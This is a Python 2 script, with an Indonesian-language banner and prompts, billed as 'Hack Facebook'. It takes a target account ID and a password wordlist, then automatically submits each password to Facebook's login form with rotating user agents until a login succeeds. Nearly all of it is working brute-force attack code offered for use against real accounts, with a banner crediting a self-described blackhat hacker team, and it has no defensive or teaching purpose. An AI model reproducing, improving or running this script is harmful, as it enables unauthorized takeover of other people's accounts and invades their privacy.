#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random




email = str(raw_input("Masukin ID target Kalian Mek|~Contoh : 1002874584775 ~| : "))


passwordlist = str(raw_input("Masukin Wordlist Kalian ~|Contoh : F3eLLTamvan.txt ~| : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """

        +===============================================================================================================+
        |                                      Hack Facebook By :  Mr.F3eLL
        +---------------------------------------------------------------------------------------------------------------+
        |            #Author: Mr.F3eLL Paling Tamvan Di Bumi Ibu
        |   #Team : BlackHat Hacker Indonesia Dan Indoesia Hacker Rulez
        |    #My Friend : Mr.SoUrchID ~ Mr.Jackers ~ Mr.Kapra ~Its_icNxmCR ~Mr.Cl4y ~ Mr.5t0n3 ~ phobiaExploi7 ~ Omest ~               |     Mr.Swaghat ~Nisa Star7 ~ M4R5H4LL ~ Tuan Swam ~ Mr.Hari ~ Ms. Rifaa ~ Baby Girl ~Cy#b3root ~4Prili666GH05T ~             |     X666T4M ~Mr.C4k3r ~Imamllyasa
        |    #Whatshap :081316826548| 
        |	       Version 1.0                |
        |   https://github.com/Rafell        |
        +===============================================================================================================+
        |                                         Hack Facebook  By : Mr.F3eLL
        +---------------------------------------------------------------------------------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
